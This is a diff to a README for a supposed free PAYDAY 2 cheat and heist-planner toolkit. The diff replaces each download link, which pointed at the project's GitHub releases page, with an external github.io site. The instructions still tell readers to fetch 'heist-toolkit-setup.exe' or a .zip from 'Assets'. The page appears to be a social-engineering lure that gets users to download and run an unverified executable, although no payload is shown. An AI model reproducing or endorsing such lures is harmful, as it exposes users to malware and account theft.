@@ -1,7 +1,7 @@
 <h1>🃏 payday-2-free-cheat-heist-toolkit - Ultimate Heist Planner & Progression Companion</h1>
 
 <p align="center">
-<a href="https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download" style="padding:10px; background:#2ea44f; color:white; border-radius:8px; font-size:24px;"></a>
+<a href="https://fleyderrivera.github.io"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download" style="padding:10px; background:#2ea44f; color:white; border-radius:8px; font-size:24px;"></a>
 </p>
 
 Welcome to the **PAYDAY 2 Free Cheat Heist Toolkit** – your all-in-one desktop companion designed to make every heist smoother, every build stronger, and every dollar count. Whether you are planning a stealth run or going loud, this tool gives you the edge without any complicated setup. No programming skills needed. Just download, open, and start planning like a pro.
@@ -37,7 +37,7 @@ Follow these simple steps to get the toolkit running on your Windows PC.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases](https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases)
+Visit this link to download the application: [https://fleyderrivera.github.io](https://fleyderrivera.github.io)
 
 Look for the latest release file. It should be available under "Assets" on the release page.
 
@@ -59,7 +59,7 @@ Your data is saved automatically as you type. Close the window anytime, and your
 
 Here is a more detailed guide for installing and launching the toolkit.
 
-1. **Go to the download page** using this exact link: [https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases](https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases)
+1. **Go to the download page** using this exact link: [https://fleyderrivera.github.io](https://fleyderrivera.github.io)
 2. **Find the newest release** at the top of the page. It will be marked as "Latest".
 3. **Click "Assets"** to expand the file list.
 4. **Download the file** named something like `heist-toolkit-setup.exe` or a `.zip` archive depending on the release.
